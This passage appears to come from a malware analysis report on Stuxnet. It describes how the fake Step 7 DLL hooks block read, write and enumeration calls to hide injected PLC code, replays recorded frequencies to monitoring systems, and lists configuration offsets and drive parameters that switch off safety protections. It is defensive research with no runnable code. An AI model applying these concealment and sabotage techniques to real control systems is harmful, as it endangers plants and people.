bits may support the theory of a secondary\nattack strategy on centrifuge systems within a cascade.\n\n##### The rootkit\n\nThe Stuxnet PLC rootkit code is contained entirely in the fake s7otbxdx.dll. In order to achieve the aim of continu­\ning to exist undetected on the PLC it needs to account for at least the following situations:\n\n- Read requests for its own malicious code blocks.\n\n- Read requests for infected blocks (OB1, OB35, DP_RECV).\n\n- Write requests that could overwrite Stuxnet’s own code.\n\nStuxnet contains code to monitor and intercept these types of request. The threat modifies these requests so\nthat Stuxnet’s PLC code is not discovered or damaged. The following list gives some examples of how Stuxnet\nuses the hooked exports to handle these situations:\n\n**•** **s7blk_read**\nUsed to read a block, is monitored so that Stuxnet returns:\n\n  - The original DP_RECV (kept as FC1869) if DP_RECV is requested.\n\n  - An error if the request regards one of its own malicious blocks.\n\n  - A cleaned version (disinfected on the fly) copy of OB1 or OB35 if such a block is requested.\n\n**•** **s7blk_write**\nUsed to write a block, is also monitored:\n\n  - Requests to OB1/OB35 are modified so that the new version of the block is infected before it’s written.\n\n  - Requests to write DP_RECV are also monitored. The first time such a request is issued, the block will be writ­\n\nten to FC1869 instead of DP_RECV. Next time an error will be raised (since these system blocks are usually\nwritten only once).\n\n  - Also note that the injection of sequence C takes place through a s7blk_write operation. Exact conditions are\n\nnot determined.\n\n**•** **s7blk_findfirst and s7blk_findnext**\nUsed to enumerate blocks of a PLC. Stuxnet will hide its own blocks by skipping them voluntarily during an\nenumeration. Note that Stuxnet recognizes its own blocks by checking a specific value it sets in a block header.\n\n**•** **s7blk_delete**\nUsed to delete blocks, is monitored carefully:\n\n  - Requests to delete a SDB may result in PLC disinfection.\n\n  - Requests to delete OB are also monitored. It seems the blocks are not necessarily deleted. They could be in­\n\nfected. For instance, deletion of OB80 (used to handle asynchronous error interrupts) can result in an empty\nOB80 being written.\n\n##### Other export hooks\n\nOther exports are hooked to achieve other functions, including PLC information gathering, others remaining\nquite obscure at the time of writing:\n\n**•** **s7db_open and s7db_close**\nUsed to obtain information used to create handles to manage a PLC (such a handle is used by APIs that ma­\nnipulate the PLC).\n\n**•** **s7ag_read_szl**\nUsed to query PLC information, through a combination of an ID and an index (it can be used for instance to get\nthe PLC type.) The export modifies the API’s return information if it’s called with specific ID=27, index=0.\n\n**•** **s7_event**\nThe purpose of the original API is unknown. The export can modify block DB8062 of sequence C.\n\n**•** **s7ag_test**\n\n**•** **s7ag_link_in**\n\n**•** **s7ag_bub_cycl_read_create**\n\n\n-----\n\n**•** **s7ag_bub_read_var**\n\n**•** **s7ag_bub_write_var**\n\n**•** **s7ag_bub_read_var_seg**\n\n**•** **s7ag_bub_write_var_seg**\n\nStuxnet records the previous operating frequencies for the frequency controllers. This data is played back to\nWinCC through these hooked functions during the sabotage routines. Thus, instead of the monitoring systems\nreceiving the anomalous operating frequency data, the monitoring systems believe the frequency converters are\noperating as normal.\n\nIn addition, OB35 is infected as previously described. When the sabotage routine occurs, OB35 prevents the\noriginal OB35 code from executing. Assuming the original OB35 code initiates a graceful shutdown during cata­\nstrophic events, even if the operators realize the system is operating abnormally, they will not be able to safely\nshutdown the system.\n\nInterestingly, OB35 uses a magic marker value of 0xDEADF007 (possibly to mean Dead Fool or Dead Foot – a\nterm used when an airplane engine fails) to specify when the routine has reached its final state.\n\n\n-----\n\n### Payload Exports\n\n#### Export 1\n\nStarts removable drive infection routine as described in the Removable Drive Propagation section. Also starts\nthe RPC server described in the Peer-to-Peer Communication section.\n\n#### Export 2\n\nHooks APIs as described in the Step 7 Project File Infections section.\n\n#### Export 4\n\nInitialization for export 18, which removes Stuxnet from the system.\n\n#### Export 5\n\nChecks if MrxCls.sys installed. The purpose of MrxCls.sys is described in the Load Point section.\n\n#### Export 6\n\nExport 6 is a function to return the version number of the threat read from the configuration data block. The ver­\nsion information is stored in the configuration data block at offset 10h.\n\n#### Export 7\n\nExport 7 simply jumps to export 6.\n\n#### Export 9\n\nExecutes possibly new versions of Stuxnet from infected Step 7 projects as described in the Step 7 Project File\nInfections section.\n\n#### Export 10\n\nExecutes possibly new versions of Stuxnet from infected Step 7 projects as described in the Step 7 Project File\nInfections section.\n\n#### Export 14\n\nMain wrapper function for Step 7 project file infections as described in the Step 7 Project File Infections section.\n\n#### Export 15\n\nInitial entry point described in the Installation section.\n\n#### Export 16\n\nMain installation routine described in the Installation section.\n\n#### Export 17\n\nReplaces a Step 7 DLL to infect PLCs as described in the Sabotaging PLCs section.\n\n\n-----\n\n#### Export 18\n\nRemoves Stuxnet from the system by deleting the following files:\n\n1. Malicious Step 7 DLL\n\n2. Driver files MrxCls.sys and MrxNet.sys\n\n3. oem7A.PNF\n\n4. mdmeric3.pnf\n\n5. mdmcpq3.pnf (Stuxnet’s configuration file)\n\n#### Export 19\n\nRemovable drive infecting routine as described in the Removable Drive Propagation section.\n\n#### Export 22\n\nContains all the network spreading routines described in the Network Spreading Routines section.\n\n#### Export 24\n\nChecks if the system is connected to the Internet. Performs a DNS query on two benign domains in the configu­\nration data (by default windowsupdate.com and msn.com) and updates the configuration data with the status.\n\n#### Export 27\n\nContains part of the code for the RPC server described in the Peer-to-Peer Communication section.\n\n#### Export 28\n\nContains command and control server functionality described in the Command and Control section.\n\n#### Export 29\n\nContains command and control server functionality described in the Command and Control section.\n\n#### Export 31\n\nExecutes possibly new versions of Stuxnet from infected Step 7 projects as described in the Step 7 Project File\nInfections section.\n\n#### Export 32\n\nThe same as export 1, except it does not check for an event signal before calling the removable drive spreading\nroutines and the RPC server code. This export is described in the Removable Drive Propagation section.\n\n### Payload Resources\n\nThe exports above need to load other files/templates/data to perform their tasks. All of these files are stored in\nthe resources section of the main .dll file. The function of each resource is discussed in detail here.\n\n#### Resource 201\n\nWindows rootkit MrxNet.sys driver signed by a compromised Realtek signature described in the Windows Rootkit\nFunctionality section.\n\n#### Resource 202\n\nThe DLL used in Step 7 project infections as described in the Step 7 Project File Infections section.\n\n\n-----\n\n#### Resource 203\n\nCAB file, contains a DLL very similar to resource 202 that is added to WinCC project directories (as described in\nStep 7 Project File Infections) and then loaded and executed through SQL statements as described in the Infect­\ning WinCC Machines section.\n\n#### Resource 205\n\nEncoded configuration file for the load point driver (MrxCls.sys) that is added to the registry. The file specifies\nwhat process should be injected and with what, which is described in the Load Point section.\n\n#### Resource 207\n\nStuxnet appended with autorun.inf information. Only in previous variants of Stuxnet.\n\n#### Resource 208\n\nStep 7 replacement DLL used in infecting PLCs as described in the Sabotaging PLCs section.\n\n#### Resource 209\n\n25 bytes long data file created in %Windir%\\help\\winmic.fts\n\n#### Resource 210\n\nTemplate PE file used by many exports when creating or injecting executables.\n\n#### Resource 221\n\nThis resource file contains the code to exploit the Microsoft Windows Server Service Vulnerability - MS08-067 as\ndescribed in the MS08-067 Windows Server Service vulnerability section.\n\n#### Resource 222\n\nThis resource file contains the code to exploit the Microsoft Windows Print Spooler Vulnerability – MS10-067 as\ndescribed in the MS10-061 Print Spooler Zero day vulnerability section.\n\n#### Resource 231\n\nChecks if the system is connected to the Internet. This resource is only in previous variants of Stuxnet.\n\n#### Resource 240\n\nUsed to build unique .lnk files depending on drives inserted as described in the Removable Drive Propagation\nsection.\n\n#### Resource 241\n\nThe file WTR4141.tmp signed by Realtek and described in the Removable Drive Propagation section.\n\n#### Resource 242\n\nMrxnet.sys rootkit file signed by Realtek.\n\n#### Resource 250\n\n0-day exploit code that results in an escalation of privilege due to the vulnerability in win32k.sys. Details are\ndescribed in the Windows Win32k.sys Local Privilege Escalation vulnerability (MS10-073) section.\n\n\n-----\n\n### Variants\n\nOut of 3,280 collected samples, three distinct variants have been identified. They have compile times of:\n\n     - Mon Jun 22 16:31:47 2009\n\n     - Mon Mar 01 05:52:35 2010\n\n     - Wed Apr 14 10:56:22 2010\n\nA fourth variant is likely to exist as a driver file, signed with the JMicron digital certificate that was found, but the\nvariant dropping this driver has yet to be recovered.\n\nThis document primarily concentrates on the March 2010 variant. The April 2010 variant only differs very slightly\nfrom the March 2010 variant. (For example, increasing the date at which USB spreading stops.) However, the\nJune 2009 has significant differences from the March and April 2010 samples. The compile times appear ac­\ncurate based on the infection times seen for each sample. A version number contained within the binary also\ncorresponds to this chronology.\n\nTable 8\n##### Comparison of Resources\n\n###### March 2010 June 2009 Resource ID Size Resource ID Size\n\n201 26,616 201 19,840\n\n202 14,848 202 14,336\n\n203 5,237\n\n205 433 205 323\n\n207 520,192\n\n208 298,000 208 298,000\n\n209 25 209 25\n\n210 9,728 210 9,728\n\n221 145,920 221 145,920\n\n222 102,400 222 102,400\n\n231 10,752\n\n240 4,171\n\n241 25,720\n\n242 17,400\n\n250 40,960\n\nAs discussed in the Stuxnet Architecture section, Stuxnet segregates its functionality via embedded resources.\nThe newer variants have more resources, but are smaller in size. Shown below are the resources for both types\nshown side by side.\n\nThe resources in green were added in the latest version, the resources in red were removed from the older ver­\nsion, and the rest of the resources are constant between both old and new samples.\n\nThe reason for the difference in size is that Resource ID 207 is absent from the newer versions. Resource 207 is\n520kB, so although more resources were added in newer versions of Stuxnet, the sum total of the new resource\nsizes is less than 520kB.\n\nThe difference in functionality between the June 2009 variant and the March and April 2010 variants is summa­\nrized below.\n\nMany of the components are actually identical or are close to identical, having the same functionality with slight\n\n|Table 8|Col2|Col3|Col4|\n|---|---|---|---|\n|Comparison of Resources||||\n|March 2010||June 2009||\n|Resource ID|Size|Resource ID|Size|\n|201|26,616|201|19,840|\n|202|14,848|202|14,336|\n|203|5,237|||\n|205|433|205|323|\n|||207|520,192|\n|208|298,000|208|298,000|\n|209|25|209|25|\n|210|9,728|210|9,728|\n|221|145,920|221|145,920|\n|222|102,400|222|102,400|\n|||231|10,752|\n|240|4,171|||\n|241|25,720|||\n|242|17,400|||\n|250|40,960|||\n\n\n-----\n\n|Table 12|Col2|Col3|Col4|\n|---|---|---|---|\n|Description of Components||||\n||Component|June 2009|March 2010|\n|201|Mrxcls.sys rootkit file|Unsigned|Signed|\n|202|Fake Siemens DLL|Same Version info but recompiled||\n|203|DLL inside a .cab file||New|\n|205|Data file|||\n|207|Large Component||Moved to 250|\n|208|Wrapper for s7otbldx.dll|Almost identical||\n|209|Data file|Identical||\n|210|Loader .dll calls payload|Almost identical||\n|221|Network Explorer|Identical||\n|222|Network Explorer|Identical||\n|231|Internet Connect .dll||Moved to main module|\n|240|Link File Template||New|\n|241|USB Loader Template||New|\n|242|Mrxnet.sys rootkit file||New|\n|250|Keyboard Hook & Injector||New|\n|Red = resource removed, green = resource added.||||\n\n\nResources 240, 241, and 242 represent the most significant additions between June 2009 and March 2010.\n[These resources exploit the Microsoft Windows Shortcut ‘LNK’ Files Automatic File Execution Vulnerability (BID](http://www.securityfocus.com/bid/41732)\n41732) and implement the Windows rootkit to hide files on USB drives.\n\nThe June 2009 variant also contained code that was removed in the March 2010 variants. In particular, the June\n2009 variants supported Windows 9x and also used autorun.inf to spread on removal drives, instead of the LNK\nexploit.\n\nResource 207 and 231 were dropped from the newer version of Stuxnet. Resource 231 was used to communicate\nwith the control servers and has the C&C server names stored in plain text within the file. The newer version\nof Stuxnet has moved the Internet connection functionality inside the main payload .dll file and has moved the\nURLs from inside resource 231 to the installer component, and the URLs are crudely obfuscated. This gives the\nattacker the distinct advantage of updating the configuration of each sample without having to rebuild the entire\npackage with a new resource inside.\n\nResource 207 has also been removed but at least part of its functionality has been retained. Resource 250 contains code that previously resided inside resource 207, although as you can see from the sizes that resource 250\nis much smaller, so some of the functionality of resource 207 has been removed.\n\n\nOf the more than 3000\nsamples recovered, almost\nall are 2010 variants. A\nvery small percentage of\nthe samples are the 2009\nvariant. The 2009 variant\nmay have spread more\nslowly and infected far\nfewer computers, or the\nlate discovery may have\nmeant infections were\neither replaced with newer\n\n\nFigure 31\n###### Stuxnet Variants\n\n\n-----\n\n### Summary\n\nStuxnet represents the first of many milestones in malicious code history – it is the first to exploit four 0-day\nvulnerabilities, compromise two digital certificates, and inject code into industrial control systems and hide the\ncode from the operator. Whether Stuxnet will usher in a new generation of malicious code attacks towards realworld infrastructure—overshadowing the vast majority of current attacks affecting more virtual or individual\nassets—or if it is a once- in-a-decade occurrence remains to be seen.\n\nStuxnet is of such great complexity—requiring significant resources to develop—that few attackers will be\ncapable of producing a similar threat, to such an extent that we would not expect masses of threats of similar\nin sophistication to suddenly appear. However, Stuxnet has highlighted direct-attack attempts on critical infra­\nstructure are possible and not just theory or movie plotlines.\n\nThe real-world implications of Stuxnet are beyond any threat we have seen in the past. Despite the exciting chal­\nlenge in reverse engineering Stuxnet and understanding its purpose, Stuxnet is the type of threat we hope to\nnever see again.\n\n\n-----\n\n### Appendix A\n\n|endix A|Col2|Col3|\n|---|---|---|\n|Table 13|||\n|Configuration Data|||\n|Offset|Type|Description|\n|+0|Dword|Magic|\n|+4|Dword|Header size|\n|+8|Dword|Validation value|\n|+C|Dword|Block size|\n|+10|Dword|Sequence number|\n|+20|Dword|Performance Info|\n|+24|Dword|Pointer to Global Config Data|\n|+30|Dword|Milliseconds to Wait|\n|+34|Dword|Flag|\n|+40|Dword|Pointer to Global Config Data|\n|+44|Dword|Pointer to Global Config Data|\n|+48|Dword|Pointer to Global Config Data|\n|+58|Dword|Buffer size|\n|+5c|Dword|Buffer size|\n|+60|Dword|Buffer size|\n|+64|Dword|Buffer size|\n|+68|Dword|Flag|\n|+6c|Dword|Flag, if 0, check +70 (if 1, infect USB without timestamp check)|\n|+70|Dword|Flag, after checking +6C, if 0, check +78 date|\n|+78|Dword|lowdatetime (timestamp before infecting USB)|\n|+7C|Dword|highdatetime|\n|+80|Dword|number of files that must be on the USB key (default 3)|\n|+88|Dword|Must be below 80h|\n|+84|Dword|Number of Bytes on disk needed - 5Mb|\n|+8c|Qword|Setup deadline (Jun 24 2012)|\n|+98|Dword|Flag|\n|+9c|Dword|Flag|\n|+A4|Qword|Timestamp (start of infection – e.g., 21 days after this time USB infection will stop)|\n|+AC|Dword|Sleep milliseconds|\n|+b0|Dword|Flag|\n|+B4|Qword|Timestamp|\n|+c4|Dword|Time stamp|\n|+c8|Dword|Flag (if 0, infect USB drive, otherwise, uninfect USB drive)|\n|+cc|Char[80h]|Good domain 1 – windowsupdate.com|\n|+14c|Char[80h]|Good domain 2 – msn.com|\n|+1cc|Char[80h]|Command and control server 1|\n|+24c|Char[80h]|URL for C&C server 1 - index.php|\n|+2cc|Char[80h]|Command and control server 2|\n|+34c|Char[80h]|URL for C&C server 2- index.php|\n\n\n-----\n\n|Table 13|Col2|Col3|\n|---|---|---|\n|Configuration Data|||\n|Offset|Type|Description|\n|+3cc|Dword|Flag|\n|+3ec|Dword|Wait time in milliseconds|\n|+3f0|Dword|Flag - connectivity check|\n|+3f4|Dword|HighDateTime|\n|+3f8|Dword|LowDateTime|\n|+3d4|Dword|TickCount (hours)|\n|+414|Dword|TickCount milliseconds|\n|+418|Char[80h]|Step7 project path|\n|+498|Dword|pointer to global config|\n|+49c|Dword|pointer to global config|\n|+4a0|Dword|Counter|\n|+59c|Dword|Flag - 0|\n|+5a0|Dword|TickCount Check|\n|+5AC|Dword|TickCount Check|\n|+5b4|PropagationData|block 2|\n|+5f0|PropagationData|block 5|\n|+62c|PropagationData|block 4|\n|+668|PropagationData|block 3|\n|+6A4|Dword|Flag to control whether WMI jobs should be run|\n|+6A8|Dword|Flag to control whether scheduled jobs should be run|\n|+6AC|Dword|Flag controlling update|\n|+6B4|Dword|Flag, disable setup|\n|+6b8|PropagationData|block 1|\n\n|Table 14|Col2|Col3|\n|---|---|---|\n|Format of a Propagation Data block|||\n|Offset|Type|Description|\n|+00|Qword|Timestamp max time|\n|+08|Qword|Timestamp AV definitions max timestamp|\n|+10|Qword|Timestamp Kernel DLLs max timestamp|\n|+18|Qword|Timestamp secondary time|\n|+20|Dword|Day count|\n|+24|Dword|Flag check secondary time|\n|+28|Dword|Flag check time|\n|+2C|Dword|Flag check AV definitions time|\n|+30|Dword|Flag check Kernel DLLs max timestamp|\n|+34|Dword||\n|+38|Dword||\n\n\n-----\n\n### Appendix B\n\n#### The oem6c.pnf log file\n\nThis file is created as %Windir%\\inf\\oem6c.pnf.\n\nIt is encrypted and used to log information about various actions executed by Stuxnet. This data file appears to\nhave a fixed size of 323,848 bytes. However the payload size is initially empty.\n\nOn top of storing paths of recorded or infected Step7 project files, other records of information are stored. Each\nrecord has an ID, a timestamp, and (eventually) data.\n\nHere is a list of records that can be stored to oem6c.pnf:\n\n##### Communication\n\n     - 2DA6h,1—No data. Stored before executing export 28.\n\n     - 2DA6h,2—No data. Stored only if export 28 executed successfully.\n\n     - 2DA6h,3—Has the initial network packet (to HTTP server) been sent.\n\n##### S7P/MCP\n\n     - 246Eh,1—Unknown. Relates to XUTILS\\listen\\XR000000.MDX.\n\n     - 246Eh,2—Unknown. Relates to GracS\\cc_alg.sav.\n\n     - 246Eh,3—Filepath S7P.\n\n     - 246Eh,4—Filepath S7P.\n\n     - 246Eh,4—Filepath MCP.\n\n     - 246Eh,5—Filepath MCP.\n\n     - 246Eh,6—Recorded Step7 project path.\n\n##### Network\n\n     - F409h, 1—Server names collected from network enumeration.\n\n     - F409h, 2—Unknown, index.\n\n     - F409h, 3—No data. Related to exploit (failure/success?).\n\n##### Infection\n\n     - 7A2Bh,2—No data. Infection of last removable device success.\n\n     - 7A2Bh,5—No data. Infection of last removable device failed.\n\n     - 7A2Bh,6—No data. Both files wtr4141/wtr4132 exist on the drive to be infected.\n\n     - 7A2Bh,7—No data. Unknown, created on error.\n\n     - 7A2Bh,8—No data. Created if not enough space on drive to be infected (less than 5Mb).\n\n##### Rootkits\n\n     - F604h,5—No data. Only if Stuxnet and the rootkits were dropped and installed correctly (installation success).\n\n\n-----\n\n### Appendix C\n\nThe following represents the parameters changed on the frequency drives and their values. Descriptions of the\nvalues are provided; however, many of these descriptions—especially for parameters over 1000—may be inaccu­\nrate (some clearly are inaccurate). These descriptions are derived from multiple sources and, ultimately, custom\napplications can be used on frequency drives that use and specify their own purpose for these values.\n\nTable 15 Table 16\n##### Parameters and values for Vacon drive Parameters and values for Fararo\n\nParameter Value Possible Description Paya drive\n\nParameter Value Possible Description\n\n###### Frames 1.1\n\n813 2 ? Frames 1.1\n\n819 0 117 49\n\n1086 1 Disable stop lock - allows parameters 118 899\nadjusting during RUN state (allinone)\n\n119 101\n\n114 0 stop button\n\n120 119\n\n301 0 DIN3 function\n\n116 8000\n\n313 0 RO1 function\n\n116 12000\n\n314 0 RO2 function\n\n116 8000\n\n315 0 output frequency limit 1 supervision\n\n116 16000\n\n346 0 output frequency limit 2 supervision\n\n122 2\n\n348 0 torque limit supervision function\n\n174 301\n\n350 0 reference limit supervision function\n\n168 1\n\n354 0 frequency converter temperature limit\n\n170 201\n\nsupervision\n\n113 2\n\n356 0 analogue supervision signal\n\n114 850\n\n700 0 Response to the 4mA reference fault\n\n142 14000 Frequency ?\n\n701 0 Response to external fault\n\n111 1\n\n702 0 Output phase supervision\n\n112 61990\n\n703 0 Earth fault protection\n\n123 0\n\n704 0 Motor thermal protection\n\n107 399\n\n709 0 Stall protection\n\n106 950\n\n713 0 Underload protection\n\n104 10500 Frequency ?\n\n727 1 Response to undervoltage fault\n\n101 10500 Frequency ?\n\n730 0 Input phase supervision\n\n104 14001\n\n732 0 Response to thermistor fault\n\n111 10000\n\n733 0 Response to fieldbus fault\n\n101 14000 Frequency ?\n\n734 0 Response to slot fault\n\n103 10490\n\n740 0 Response to PT100 fault\n\n102 10480\n\n1316 0 Brake fault action (allinone)\n\n166 1\n\n1082 0 SystemBus communication fault re­\nsponse (allinone) 173 1\n\n752 0 Speed error fault function 169 1\n\n1353 0 Encoder fault mode (advanced) 112 30000\n\n303 0 reference scaling min value 0 0\n\n304 0 reference scaling maximum value 169 1\n\n305 0 reference inversion\n\n|Table 15|Col2|Col3|\n|---|---|---|\n|Parameters and values for Vacon drive|||\n|Parameter|Value|Possible Description|\n|Frames 1.1|||\n|813|2|?|\n|819|0||\n|1086|1|Disable stop lock - allows parameters adjusting during RUN state (allinone)|\n|114|0|stop button|\n|301|0|DIN3 function|\n|313|0|RO1 function|\n|314|0|RO2 function|\n|315|0|output frequency limit 1 supervision|\n|346|0|output frequency limit 2 supervision|\n|348|0|torque limit supervision function|\n|350|0|reference limit supervision function|\n|354|0|frequency converter temperature limit supervision|\n|356|0|analogue supervision signal|\n|700|0|Response to the 4mA reference fault|\n|701|0|Response to external fault|\n|702|0|Output phase supervision|\n|703|0|Earth fault protection|\n|704|0|Motor thermal protection|\n|709|0|Stall protection|\n|713|0|Underload protection|\n|727|1|Response to undervoltage fault|\n|730|0|Input phase supervision|\n|732|0|Response to thermistor fault|\n|733|0|Response to fieldbus fault|\n|734|0|Response to slot fault|\n|740|0|Response to PT100 fault|\n|1316|0|Brake fault action (allinone)|\n|1082|0|SystemBus communication fault re­ sponse (allinone)|\n|752|0|Speed error fault function|\n|1353|0|Encoder fault mode (advanced)|\n|303|0|reference scaling min value|\n|304|0|reference scaling maximum value|\n\n|Table 16|Col2|Col3|\n|---|---|---|\n|Parameters and values for Fararo Paya drive|||\n|Parameter|Value|Possible Description|\n|Frames 1.1|||\n|117|49||\n|118|899||\n|119|101||\n|120|119||\n|116|8000||\n|116|12000||\n|116|8000||\n|116|16000||\n|122|2||\n|174|301||\n|168|1||\n|170|201||\n|113|2||\n|114|850||\n|142|14000|Frequency ?|\n|111|1||\n|112|61990||\n|123|0||\n|107|399||\n|106|950||\n|104|10500|Frequency ?|\n|101|10500|Frequency ?|\n|104|14001||\n|111|10000||\n|101|14000|Frequency ?|\n|103|10490||\n|102|10480||\n|166|1||\n|173|1||\n|169|1||\n|112|30000||\n|0|0||\n|169|1||\n\n\n-----\n\n|Table 15|Col2|Col3|\n|---|---|---|\n|Parameters and values for Vacon drive|||\n|Parameter|Value|Possible Description|\n|434|0|fault|\n|436|0|warning active|\n|438|0|reference fault/warning|\n|439|0|overtemperature warning|\n|441|0|unrequested direction|\n|444|0|external control place|\n|445|0|external brake control|\n|447|0|output frequency limit 1 supervision|\n|448|0|output frequency limit 2 supervision|\n|449|0|Reference limit supervision|\n|450|0|Temperature limit supervision|\n|451|0|Torque limit supervision|\n|452|0|Thermistor fault or warning|\n|463|0|Analogue input supervision limit|\n|485|0|Scaling of motoring torque limit|\n|464|0|Analogue output 1 signal selection|\n|307|0|analogue output function|\n|471|0|Analogue output 2 signal selection|\n|472|0|Analogue output 2 function|\n|478|0|Analogue output 3/ signal selection|\n|479|0|Analogue output 3/ function|\n|312|0|digital output 1 function|\n|486|0|Digital output 1 signal selection|\n|490|0|Digital output 2 function|\n|489|0|Digital output 2 signal selection|\n|307|0|analogue output function|\n|472|0|Analogue output 2 function|\n|479|0|Analogue output 3/ function|\n|464|0|Analogue output 1 signal selection|\n|471|0|Analogue output 2 signal selection|\n|478|0|Analogue output 3/ signal selection|\n|484|0|Analogue output 3 offset|\n|312|0|digital output 1 function|\n|490|0|Digital output 2 function|\n|486|0|Digital output 1 signal selection|\n|489|0|Digital output 2 signal selection|\n|414|0|fault reset|\n|415|0|acc/dec prohibited|\n|416|0|DC-braking|\n|750|1|Cooling monitor|\n\n|Table 16|Col2|Col3|\n|---|---|---|\n|Parameters and values for Fararo Paya drive|||\n|Parameter|Value|Possible Description|\n|0|0||\n|Frames 1.2|||\n|123|0||\n|112|1||\n|102|10||\n|103|500||\n|101|10000|Frequency?|\n|104|10640|Frequency?|\n|107|400||\n|105|33||\n|106|100||\n|117|20||\n|118|650||\n|119|400||\n|120|100||\n|174|450||\n|168|4||\n|170|400||\n|113|1||\n|114|750||\n|112|10||\n|111|10||\n|142|10640|Frequency?|\n|169|1||\n|173|1||\n|Frames 2.1|||\n|117|49||\n|118|899||\n|119|101||\n|120|119||\n|116|8000||\n|116|12000||\n|116|8000||\n|116|16000||\n|122|2||\n|166|1||\n|174|301||\n|168|1||\n|170|201||\n\n\n1213 1 Emergency Stop (allinone)\n\n\n113 2\n\n\n-----\n\n|Table 15|Col2|Col3|\n|---|---|---|\n|Parameters and values for Vacon drive|||\n|Parameter|Value|Possible Description|\n|1420|1|Prevention of startup (allinone)|\n|399|0|scaling of current limit|\n|400|0|scaling of DC breaking current|\n|401|0|scaling of acc/dec time|\n|405|0|external fault close|\n|406|1|external fault open|\n|407|1|run enable|\n|411|1|control from fieldbus|\n|409|0|control from I/O terminal|\n|410|0|control from keyboard|\n|107|44|current limit|\n|107|440|current limit|\n|509|0|Prohibit frequency area 1/ Low limit|\n|510|0|Prohibit frequency area 1/ High limit|\n|511|0|Prohibit frequency area 2/ Low limit|\n|512|0|Prohibit frequency area 2/ High limit|\n|513|0|Prohibit frequency area 3/ Low limit|\n|514|0|Prohibit frequency area 3/ High limit|\n|104|19990|deceleration time 1 ?|\n|503|19990|deceleration time 2 ?|\n|1541|19990|Selma Fault Word 1 - ?|\n|1542|19990|Selma Fault Word 2 - ?|\n|508|0|DC-braking time at stop|\n|516|0|DC-braking time at start|\n|506|1|stop function|\n|505|0|start function|\n|1500|1|Current limit (multimotor) or DIN5 func­ tion (lift app)|\n|103|4000|acceleration time 1|\n|502|4000|acceleration time 2|\n|1531|1|Min frequency (highspeed multimotor)|\n|125|3|control place|\n|122|3|fieldbus control reference|\n|102|1410||\n|1502|1|Maximum frequency (highspeed mul­ timotor)|\n|1505|1|Current limit (highspeed multimotor)|\n|1508|1|Nominal speed of the motor (highspeed multimotor)|\n|1511|1|I/O reference (highspeed multimotor)|\n|1514|1|Start function (highspeed multimotor)|\n\n|Table 16|Col2|Col3|\n|---|---|---|\n|Parameters and values for Fararo Paya drive|||\n|Parameter|Value|Possible Description|\n|114|850||\n|102|1||\n|108|1||\n|109|1||\n|105|280||\n|106|281||\n|103|400||\n|112|1||\n|111|30000||\n|123|0||\n|142|2||\n|107|380||\n|101|2||\n|104|500|Frequency?|\n|169|1||\n|173|1||\n|0|0||\n|169|1||\n|Frames 2.2|||\n|123|0||\n|111|1||\n|104|10640|Frequency?|\n|103|500||\n|101|10000||\n|102|10||\n|107|400||\n|105|33||\n|106|100||\n|166|1||\n|117|20||\n|118|650||\n|119|400||\n|120|100||\n|122|2||\n|174|450||\n|168|4||\n|170|400||\n|113|1||\n|114|750||\n|108|1500||\n\n\n-----\n\n|Table 16|Col2|Col3|\n|---|---|---|\n|Parameters and values for Fararo Paya drive|||\n|Parameter|Value|Possible Description|\n|109|1200||\n|112|10||\n|111|10||\n|142|10640|Frequency?|\n|169|1||\n|173|1||\n\n|Table 15|Col2|Col3|\n|---|---|---|\n|Parameters and values for Vacon drive|||\n|Parameter|Value|Possible Description|\n|1517|1|DC braking time at stop (highspeed multimotor)|\n|1520|1|Measured Rs voltage drop (multimotor2)|\n|1503|1|Acceleration time 1 (highspeed multimo­ tor)|\n|1506|1|Nominal voltage of the motor (highspeed multimotor)|\n|1509|1|Nominal current of the motor (high­ speed multimotor)|\n|1512|1|Analogue output function (highspeed multimotor)|\n|1515|1|Stop function (highspeed multimotor)|\n|1518|1|Follower drive windong phase shift (advanced)|\n|600|0|Motor control mode|\n|521|0|Motor control mode 2|\n|1522|1|Analogue output 4 inversion (advanced)|\n|1526|1|DIN5 function (highspeed multimotor)|\n|1525|1|Analogue output 4 scaling (advanced)|\n|1532|0|Max frequency (highspeed multimotor)|\n|1527|0|Analogue output 4 signal selection (advanced)|\n|110|400|nominal voltage of motor|\n|1519|1064||\n|1516|1063||\n|1520|29990|Measured Rs voltage drop (multimotor2)|\n|1517|29990|DC braking time at stop (highspeed multimotor)|\n|1522|1|Analogue output 4 inversion (advanced)|\n|1526|1|DIN5 function (highspeed multimotor)|\n|1525|1|Analogue output 4 scaling (advanced)|\n|1519|1410||\n|1516|1400||\n|1517|4000|DC braking time at stop (highspeed multimotor)|\n|1518|5990|Follower drive windong phase shift (advanced)|\n|1513|1062||\n|1510|1061||\n|1507|1060||\n|1504|1059||\n|1501|1058||\n|0|0||\n\n\n-----\n\n|Table 15|Col2|Col3|\n|---|---|---|\n|Parameters and values for Vacon drive|||\n|Parameter|Value|Possible Description|\n|Frames 1.2|||\n|812|12|Number of stop bits|\n|0|0||\n|Frames 2.1|||\n|813|2|?|\n|819|0||\n|1086|1|Disable stop lock - allows parameters adjusting during RUN state (allinone)|\n|114|0|stop button|\n|506|0|stop function|\n|315|0|output frequency limit 1 supervision|\n|346|0|output frequency limit 2 supervision|\n|348|0|torque limit supervision function|\n|350|0|reference limit supervision function|\n|354|0|frequency converter temperature limit supervision|\n|356|0|analogue supervision signal|\n|700|0|Response to the 4mA reference fault|\n|701|0|Response to external fault|\n|702|0|Output phase supervision|\n|703|0|Earth fault protection|\n|704|0|Motor thermal protection|\n|709|0|Stall protection|\n|713|0|Underload protection|\n|727|1|Response to undervoltage fault|\n|730|0|Input phase supervision|\n|732|0|Response to thermistor fault|\n|733|0|Response to fieldbus fault|\n|734|0|Response to slot fault|\n|740|0|Response to PT100 fault|\n|1316|0|Brake fault action (allinone)|\n|1082|0|SystemBus communication fault re­ sponse (allinone)|\n|752|0|Speed error fault function|\n|1353|0|Encoder fault mode (advanced)|\n|303|0|reference scaling min value|\n|304|0|reference scaling maximum value|\n|305|0|reference inversion|\n|434|0|fault|\n|436|0|warning active|\n|438|0|reference fault/warning|\n\n\n439 0 overtemperature warning\n\n\n-----\n\n|Table 15|Col2|Col3|\n|---|---|---|\n|Parameters and values for Vacon drive|||\n|Parameter|Value|Possible Description|\n|441|0|unrequested direction|\n|444|0|external control place|\n|445|0|external brake control|\n|447|0|output frequency limit 1 supervision|\n|448|0|output frequency limit 2 supervision|\n|449|0|Reference limit supervision|\n|450|0|Temperature limit supervision|\n|451|0|Torque limit supervision|\n|452|0|Thermistor fault or warning|\n|463|0|Analogue input supervision limit|\n|485|0|Scaling of motoring torque limit|\n|464|0|Analogue output 1 signal 